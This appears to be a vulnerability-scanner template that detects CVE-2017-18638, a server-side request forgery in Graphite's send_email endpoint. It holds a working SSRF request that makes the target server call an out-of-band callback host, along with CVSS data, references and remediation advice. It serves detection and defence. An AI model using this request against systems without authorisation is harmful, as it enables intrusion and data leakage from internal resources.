http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}/composer/send_email?to={{rand_text_alpha(4)}}@{{rand_text_alpha(4)}}&url=http://{{interactsh-url}}'
id: CVE-2017-18638
info:
  author: huowuzhao
  classification:
    cpe: cpe:2.3:a:graphite_project:graphite:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-18638
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
    epss-percentile: 0.99599
    epss-score: 0.90804
  description: 'Graphite''s send_email in graphite-web/webapp/graphite/composer/views.py
    in versions up to 1.1.5 is vulnerable to server-side request forgery (SSR)F. The
    vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server
    request any resource. The response to this SSRF request is encoded into an image
    file and then sent to an email address that can be supplied by the attacker. Thus,
    an attacker can exfiltrate any information.

    '
  impact: 'An attacker can exploit this vulnerability to access internal resources,
    potentially leading to unauthorized access, data leakage, or further attacks.

    '
  metadata:
    max-request: 1
    product: graphite
    vendor: graphite_project
  name: Graphite <=1.1.5 - Server-Side Request Forgery
  reference:
  - http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
  - https://github.com/graphite-project/graphite-web/issues/2008
  - https://github.com/advisories/GHSA-vfj6-275q-4pvm
  - https://nvd.nist.gov/vuln/detail/CVE-2017-18638
  - https://github.com/graphite-project/graphite-web/pull/2499
  remediation: 'Upgrade to a patched version of Graphite (>=1.1.6) or apply the necessary
    security patches.

    '
  severity: high
  tags: cve,cve2017,graphite,ssrf,oast,graphite_project,vuln
